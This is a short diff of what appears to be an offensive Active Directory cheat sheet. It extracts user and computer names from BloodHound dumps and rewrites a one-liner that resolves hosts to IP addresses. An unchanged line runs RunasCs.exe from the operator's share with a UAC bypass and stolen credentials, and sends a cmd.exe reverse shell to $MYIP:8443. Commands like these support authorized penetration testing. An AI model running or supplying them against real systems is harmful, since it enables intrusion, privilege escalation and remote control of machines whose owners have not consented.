@@ -1748,7 +1748,7 @@ cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | t
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 
 +---------- Identify Hosts from Computers ----------+
-sort -u computers_$DC | sed 's/\$$//' | paste -sd, - | sed 's/^/@("/;s/,/","/g;s/$/")|%{ $comp=$_; $r=Resolve-DnsName $comp -Type A -EA 0; if($r){ $r|%{[pscustomobject]@{Name=$comp;IP=$_.IPAddress}}}}|ft -auto/'
+sort -u computers_$DC | sed 's/\$$//' | paste -sd, - | sed 's/^/@("/;s/,/","/g;s/$/") | ForEach-Object { $comp=$_; Resolve-DnsName $_ -Type A -ErrorAction SilentlyContinue | Select-Object @{Name=\"Name\";Expression={$comp}},IPAddress } | Format-Table -AutoSize/'
 
 +---------- Switch User: Known Creds ----------+
 //$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:8443
